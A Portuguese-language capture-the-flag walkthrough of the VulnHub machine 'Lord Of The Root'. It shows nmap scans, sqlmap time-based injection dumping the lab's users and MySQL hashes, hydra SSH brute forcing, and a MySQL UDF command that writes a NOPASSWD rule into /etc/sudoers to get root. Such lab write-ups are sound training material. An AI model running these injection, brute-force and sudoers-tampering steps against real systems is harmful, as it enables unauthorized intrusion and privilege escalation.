## Lord Of The Root: 1.0.1

- Link para download: https://www.vulnhub.com/entry/lord-of-the-root-101,129/

1) Máquina importada no VirtualBox, identificada e adicionada ao /etc/hosts, nmap para começar a enumeração:

```
# Nmap 7.80 scan initiated Wed Aug 19 17:23:29 2020 as: nmap -p- -sV -sC -T5 -A -oN nmap_lord lord
Nmap scan report for lord (192.168.56.114)
Host is up (0.00058s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
MAC Address: 08:00:27:A5:65:F5 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms lord (192.168.56.114)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 17:24:26 2020 -- 1 IP address (1 host up) scanned in 56.84 seconds
```
Só o ssh disponível? Estranho, será que é a porta de entrada do servidor? Vou atrás do exploit-db e não acho nada explícito, nenhuma vulnerabilidade para essa versão do OpenSSH.

2) Tento um login ssh e recebo o seguinte banner:

```
┌─[user@parrot]─[/tmp/lord]
└──╼ $ssh root@lord
The authenticity of host 'lord (192.168.56.114)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'lord,192.168.56.114' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
```

Bom o que parece é que existe uma implementação de port-knocking (https://netslovers.com/2018/02/28/port-knocking-server-securing-ssh-connection-centos-7/). Executo novamente o nmap, e para não randomizar o scan `-r (Don't randomize ports)`:

```
root@parrot:/tmp/lord# nmap -r -p- -sV -sC -T5 -A lord
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-19 18:05 -03
Nmap scan report for lord (192.168.56.114)
Host is up (0.00060s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:A5:65:F5 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms lord (192.168.56.114)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.56 seconds
```

3) Ok, agora tenho um Apache na porta 1337 para trabalhar, de praxe executo o gobuster:

```
root@parrot:/tmp/lord# gobuster dir -u http://lord:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,sh,ssh,bak
===============================================================                                                                                                                                                                                                                
Gobuster v3.0.1                                                                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                        
===============================================================                                                                        
[+] Url:            http://lord:1337                                                                                                   
[+] Threads:        10                                                                                                                 
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                       
[+] Status codes:   200,204,301,302,307,401,403                                                                                        
[+] User Agent:     gobuster/3.0.1                                                                                                     
[+] Extensions:     bak,html,txt,php,sh,ssh                                                                                            
[+] Timeout:        10s                                                                                                                
===============================================================                                                                        
2020/08/19 17:47:33 Starting gobuster                                                                                                  
===============================================================                                                                        
/index.html (Status: 200)                                    
/images (Status: 301)                                                                                                                  
/404.html (Status: 200)
```

Vou até o 404.html e lá no código-fonte da página tem a seguinte string:

```
THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
```

4) Parece ser base64, vou até o CyberChef e tenho o que parece ser uma URL `/978345210/index.php`:

![imagem](https://raw.githubusercontent.com/ridlaw/capturetheflag/gh-pages/pics/formulario_lord.png)

Vou até ela e tenho um formulário, de cara já abro o Burp Suite, pego o POST de login e executo o sqlmap:

```
root@parrot:/tmp/lord# sqlmap -r post_exploit --batch -p admin,password                          
        ___                                                                                                                            
       __H__                                                       
 ___ ___[)]_____ ___ ___  {1.4.6#stable}               
|_ -| . [)]     | .'| . |                                          
|___|_  [']_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   http://sqlmap.org                                                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage
caused by this program                  

[*] starting @ 17:56:03 /2020-08-19/                   

[17:56:03] [INFO] parsing HTTP request from 'post_exploit'         
[17:56:04] [WARNING] provided parameters 'admin, password' are not inside the Cookie                                                                                                                                                                                           
[17:56:04] [INFO] testing connection to the target URL
[17:56:04] [INFO] checking if the target is protected by some kind of WAF/IPS                                                          
[17:56:04] [INFO] testing if the target URL content is stable
[17:56:04] [INFO] target URL content is stable                     
[17:56:04] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable                               
[17:56:04] [INFO] testing for SQL injection on POST parameter 'password'                                                               
[17:56:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                           
[17:56:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'          
[17:56:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:56:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:56:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                  
[17:56:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                  
[17:56:05] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                       
[17:56:05] [INFO] testing 'Generic inline queries'           
[17:56:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                  
[17:56:05] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                      
[17:56:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                               
[17:56:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                         
[17:56:15] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

Certo, o parâmetro `password` é injetável, então vamos lá, executo primeiro um --dbs e tenho algumas tabelas como retorno, busco a que a aplicação deve estar usando:
```
root@parrot:/tmp/lord# sqlmap -r post_exploit --batch -p password -D Webapp --tables --dump
```

Um bom tempo passado (já que se trata de uma injeção baseada em tempo https://www.sqlinjection.net/time-based/) tenho:

```
Database: Webapp
Table: Users
[5 entries]
+------+----------+------------------+
| id   | username | password         |
+------+----------+------------------+
| 1    | frodo    | iwilltakethering |
| 2    | smeagol  | MyPreciousR00t   |
| 3    | aragorn  | AndMySword       |
| 4    | legolas  | AndMyBow         |
| 5    | gimli    | AndMyAxe         |
+------+----------+------------------+
```

5) Ótimo, logo na aplicação com todos os usuários e só tem um meme do Legolas kkkkk, vou atrás do ssh:

```
root@parrot:/tmp/lord# hydra -L users -P password ssh://lord
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-20 10:57:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://lord:22/
[22][ssh] host: lord   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 10:57:44
```

Maravilha! Me logo como o smeagol (`my precioussssssssss...`).

6) A partir daqui travei um pouco, não achei nada relevante, rodei o linpeas.sh, o lse.sh, pspy64 e nada. Enquanto trabalhava fui tendo algumas ideias, identifiquei o diretório /SECRET na raiz com o seguinte conteúdo:

```
smeagol@LordOfTheRoot:/SECRET$ md5sum door1/file
f0c663095117d908e16412570d2c6252  door1/file
smeagol@LordOfTheRoot:/SECRET$ md5sum door2/file
f0c663095117d908e16412570d2c6252  door2/file
smeagol@LordOfTheRoot:/SECRET$ md5sum door3/file
bb0e0e4439b5039e71405f8a1b6d5c0c  door3/file
```

Três 'portas', as duas primeiras com o mesmo arquivo, a terceira com um hash diferente. Consegui identificar o tamanho do buffer colocando vários `AAAAAA` até me retornar um `Segmentation fault`, mas olhando rapidamente no gdb travei denovo e já não sabia o que fazer, aparentemente esses bináros eram um rabbit hole.


7) Voltei para a enumeração, busquei escalação via kernel e nada, até que rodei novamente um `ps -ef | grep root` e percebi que quem estava executando o mysql era o root, hum, vamos por essa linha. O login ao MySQL pedia senha, que eu não tinha, então vamos explorar com o sqlmap novamente:
```
root@parrot:/tmp/lord# sqlmap -r post_exploit --batch -p password -D mysql -T user --dump
```

```
Host,User,plugin,ssl_type,Drop_priv,File_priv,Alter_priv,Event_priv,Grant_priv,Index_priv,Super_priv,Password,ssl_cipher,Create_priv,Delete_priv,Insert_priv,Reload_priv,Select_priv,Update_priv,max_updates,x509_issuer,Execute_priv,Process_priv,Show_db_priv,Trigger_priv,x509_subject,Shutdown_priv,max_questions,Show_view_priv,References_priv,Repl_slave_priv,max_connections,Create_user_priv,Create_view_priv,Lock_tables_priv,Repl_client_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv,authentication_string,Create_tablespace_priv
127.0.0.1,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow),<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
::1,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow),<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
localhost,debian-sys-maint,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow),<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
localhost,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*A55A9B9049F69BC2768C9284615361DFBD580B34,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,NULL,Y
lordoftheroot,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow),<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
```

Aí está, parece que a credencial do root é `darkshadow`. Me logo e checo a versão:

```
Your MySQL connection id is 9410
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)                                                                                                                                                                                                                                                                                                
Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.                                                                                                                                                                                                                                                                    
Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                                                                                                                              affiliates. Other names may be trademarks of their respective
owners.                                                                                                                                                                                                                                                                                                                                         
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                                                                                                                                                                                                  
mysql>
```

8) A partir daí lembrei da sala `Linux PrivEsc` do TryHackme, `Task 2` e só segui novamente o que estava ali, alterando só o payload (https://www.exploit-db.com/exploits/1518):

```
select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers');
```

9) Chamo o bash via sudo `sudo bash` e agora eu sou o Lord Of The Root kkkkk, tenho a flag:

```
root@LordOfTheRoot:/root# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```
